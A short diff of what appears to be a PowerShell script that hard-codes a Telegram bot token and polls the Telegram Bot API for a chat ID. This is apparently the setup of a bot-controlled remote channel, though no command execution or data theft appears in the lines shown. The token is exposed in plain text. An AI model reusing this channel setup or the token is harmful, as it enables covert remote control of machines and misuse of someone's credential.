@@ -15,7 +15,7 @@ dagnazty - https://github.com/dagnazty
 
 
 
-$token = '6609237868:AAH3RePygk7Q6uAbvpasSiddOHIrLM3QGYI'
+$Token = '6609237868:AAH3RePygk7Q6uAbvpasSiddOHIrLM3QGYI'
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
 while($chatID.length -eq 0){
     $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
